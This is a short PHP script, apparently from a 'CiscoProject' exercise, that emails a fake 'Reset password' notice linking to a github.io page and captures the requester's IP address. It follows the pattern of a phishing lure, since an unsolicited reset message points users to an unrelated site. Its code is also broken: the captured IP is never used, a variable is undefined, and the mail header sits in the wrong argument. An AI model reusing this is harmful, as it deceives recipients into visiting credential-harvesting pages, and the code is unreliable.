<?php

$AddressToEmailTo = "tloftin68@gmail.com";

$SubjectOfEmail = "Reset password";
// End of customization //
//////////////////////////
///
$content =  "Click the following link to reset your password: https://tiaral2015.github.io/CiscoProject/";
if( isset($_GET['IP']) ) { $_GET['IP '] = $_SERVER['REMOTE_ADDR']; }
else { $_GET['IP'] = $_SERVER['REMOTE_ADDR']; }
ksort($_GET);
mail($AddressToEmailTo,$SubjectOfEmail,$content,$image,"From: $AddressToEmailTo");
?>


